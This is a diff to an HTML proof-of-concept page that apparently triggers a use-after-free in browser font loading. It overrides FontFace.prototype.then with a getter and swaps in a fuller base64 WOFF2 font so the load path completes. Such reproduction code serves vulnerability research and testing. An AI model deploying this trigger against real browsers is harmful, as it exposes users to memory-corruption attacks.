@@ -45,16 +45,18 @@ Object.defineProperty(FontFace.prototype, 'then', {
 
 const sheet = document.createElement('style');
 // Use local('Helvetica') to prefer a synchronous local-font completion path
-// Do not apply the font to any visible element to prevent early loading
+// Use a valid minimal WOFF2 base64 for the second face to prevent NetworkError
+const validFont = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+
 sheet.textContent = `
 @font-face {
     font-family: 'UafFamily';
-    src: local('Helvetica');
+    src: local('Helvetica'), local('Arial');
     unicode-range: U+0041;
 }
 @font-face {
     font-family: 'UafFamily';
-    src: url('data:font/woff2;base64,d09GMgABAAAAAAIAAA==') format('woff2');
+    src: url(data:font/woff2;base64,${validFont}) format('woff2');
     unicode-range: U+0042;
 }
 `;
@@ -76,4 +78,4 @@ document.fonts.load('16px UafFamily', 'AB').then(faces => {
 L('[+] document.fonts.load() called (synchronous path may have already triggered getter)');
 </script>
 </body>
-</html> 
+</html>
